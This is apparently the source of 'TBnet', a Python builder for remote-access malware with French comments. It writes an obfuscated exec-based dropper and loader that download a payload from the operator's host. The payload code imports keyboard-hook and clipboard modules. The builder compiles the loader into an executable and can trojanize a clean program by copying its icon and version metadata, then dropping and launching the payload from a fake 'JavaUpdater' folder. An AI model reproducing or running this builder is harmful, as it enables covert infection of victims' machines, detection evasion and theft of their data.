import argparse
import subprocess
import os
import shutil
import base64
import zlib
import marshal

image = """ _______  ______                __
|_     _||   __ \.-----..-----.|  |_
  |   |  |   __ <|     ||  -__||   _|
  |___|  |______/|__|__||_____||____|
"""
print(image)
parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', 
                    type=str, 
                    required=True, 
                    dest='host',
                    help='Ip du Server')
parser.add_argument('--port', 
                    type=int, 
                    required=False, 
                    dest='port',
                    default=4444,
                    help='Port du Server')
parser.add_argument('--name',
                    type=str, 
                    required=False, 
                    dest='name', 
                    default="tbnet",
                    help='Définir nom du fichier')
parser.add_argument('--persistance',
                    type=bool,
                    required=False,
                    dest='persistance',
                    default=False,
                    help='Active la persistance automatique')
parser.add_argument('--freeze',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='freeze',
                    default=False,
                    help='compile le client dans un executable')
parser.add_argument('--hide-in-exe',
                    type=str,
                    required=False,
                    dest='path_exe',
                    default='',
                    help='Cache un payload dans un exe sain')
parser.add_argument('--obf',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='obf',
                    default=False,
                    help='obfusque le code python')
parser.add_argument('--icon',
                    type=str,
                    required=False,
                    dest='icon',
                    default='',
                    help='Ajoute une icon à l\'éxecutable')

args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"
    pathDirHttp = "./http/"
    pathPyInstaller = "C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe"
    upx_dir = "C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64"

    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe):
        fin_dropeur = """)))))
    except Exception as e:
        print(str(e))
        time.sleep(5*60)"""
        debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
        fin_loader = ")))"
        # definir url du payload
        url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
        # creer les dossier outpu et http si il n'éxiste pas
        if not os.path.exists(self.pathDirOutput):
            os.makedirs(self.pathDirOutput)
        if not os.path.exists(self.pathDirHttp):
            os.makedirs(self.pathDirHttp)
        # ecrire le payload dans http
        fichier = open(self.pathDirHttp + name + ".pyw", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()
        # obfusqué le payload
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirHttp + name + ".pyw" + " " + self.pathDirHttp + name + ".pyw")
        # ecrire le dropeur dans output
        fichier = open(self.pathDirOutput + "drop_" + name + ".pyw", "w")
        ## import sys,zlib,base64,marshal,json,urllib
        dropper = self.ReturnFichier("dropeur.txt") + "{}".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2))))) + fin_dropeur
        fichier.write(dropper)
        fichier.close()
        # obfusqué le droppeur
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirOutput + "drop_" + name + ".pyw" + " " + self.pathDirOutput + "drop_" + name + ".pyw")
        # ecrire le loader dans output
        fichier = open(self.pathDirOutput + "load_" + name + ".pyw", "w")
        drop_txt = str(base64.b64encode(open(self.pathDirOutput + "drop_" + name + ".pyw", "r").read().encode('utf-8')))[1:]
        fichier.write(debut_loader + drop_txt + fin_loader)
        fichier.close()
        # si l'options freeze est choisi
        if path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
            if freeze: ### --onefile
                ## Complier le loader
                if icon == "":
                    cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
                    os.system(cmd)
                else:
                    cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
                    os.system(cmd)
                print("Compilation terminer")
                print("Nettoyage des fichier temporaire")
                # netoyyer fichier temporaire
                shutil.copyfile("load_" + name + ".exe", self.pathDirOutput + name + ".exe")
                if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                    os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
                if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                    os.remove(self.pathDirOutput + "load_" + name + ".pyw")
                if os.path.exists("load_" + name + ".exe"):
                    os.remove("load_" + name + ".exe")
                shutil.rmtree("load_" + name + ".dist/")
                shutil.rmtree("load_" + name + ".build/")
                shutil.rmtree("load_" + name + ".onefile-build/")

                print("Client executable prêt : output/" + name + ".exe")
            else:
                print("Client prêt : output/" + "load_" + name + ".pyw")
        else:
            ## Complier le loader
            cmd = "py -m nuitka --follow-imports --include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --onefile {}".format(self.pathDirOutput + "load_" + name + ".pyw")
            os.system(cmd)
            shutil.copyfile("load_" + name + ".exe", self.pathDirHttp + name + ".exe")
            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
            if os.path.exists("load_" + name + ".exe"):
                os.remove("load_" + name + ".exe")
            shutil.rmtree("load_" + name + ".dist/")
            shutil.rmtree("load_" + name + ".build/")
            shutil.rmtree("load_" + name + ".onefile-build/")


            ## Récupérer l'icon du fichier safe
            #path_ico = self.PngToIcon(self.ExtractIcon(path_exe))

            name_payload = os.path.basename(self.pathDirHttp + name + ".exe")
            name_exe = os.path.basename(path_exe)
            url_payload = "\"http://" + ip + ":" + str(port + 1) + "/" + name_payload + "\""
            url_safe = "\"http://" + ip + ":" + str(port + 1) + "/" + name_exe + "\""
            # host le fichier safe
            shutil.copyfile(path_exe, self.pathDirHttp + name_exe)
            loader_hide_file = """import os
import subprocess
import urllib.request
import os
pathAppData = os.getenv('APPDATA')
pathDir = pathAppData + "\\\\JavaUpdater\\\\"
if not os.path.exists(pathDir):
    os.makedirs(pathDir)
if not os.path.exists(pathDir + "{}"):
    urllib.request.urlretrieve({},pathDir + "{}")
cmd = "start " + pathDir + "{}"
resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
if not os.path.exists(pathDir + "{}"):
    urllib.request.urlretrieve({},pathDir + "{}")
cmd = "start " + pathDir + "{}"
resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_exe, url_safe, name_exe, name_exe)

            name_exe_no_ext, ext_exe  = os.path.splitext(os.path.basename(path_exe))
            fichier = open(self.pathDirOutput + name_exe_no_ext + ".pyw", "w")
            fichier.write(loader_hide_file)
            fichier.close()
            ## Compiler le faux programmes
            fileVersionNumber, companyName, fileDescription = self.ExtractInfo(path_exe)
            ##--windows-company-name=  --windows-file-version=  --windows-file-description=
            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
            os.system(cmd)
            shutil.copyfile(name_exe_no_ext + ".exe", self.pathDirOutput + name_exe_no_ext + ".exe")
            if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
                os.remove(self.pathDirOutput + name_exe_no_ext + ".pyw")
            if os.path.exists(name_exe_no_ext + ".exe"):
                os.remove(name_exe_no_ext + ".exe")
            shutil.rmtree(name_exe_no_ext + ".dist/")
            shutil.rmtree(name_exe_no_ext + ".build/")
            shutil.rmtree(name_exe_no_ext + ".onefile-build/")

            ## & '.\exiftool(-k).exe' C:\Users\theoc\Desktop\putty.exe
            """
            File Version Number
            Company Name
            FileDescription
            """
            


    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text

    def ExtractInfo(self, file):
        
        import exiftool

        with exiftool.ExifTool("C:/Users/theoc/AppData/Local/Programs/Python/Python37/exiftool(-k).exe") as et:
            print("Lancement de ExifTool")
            metadata = et.get_metadata(file)
            fileVersionNumber = metadata["EXE:FileVersionNumber"]
            companyName = metadata["EXE:CompanyName"]
            fileDescription = metadata["EXE:FileDescription"]
            print("{} {} {}".format(fileVersionNumber, companyName, fileDescription))
            return fileVersionNumber, companyName, fileDescription
        
        

GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe)

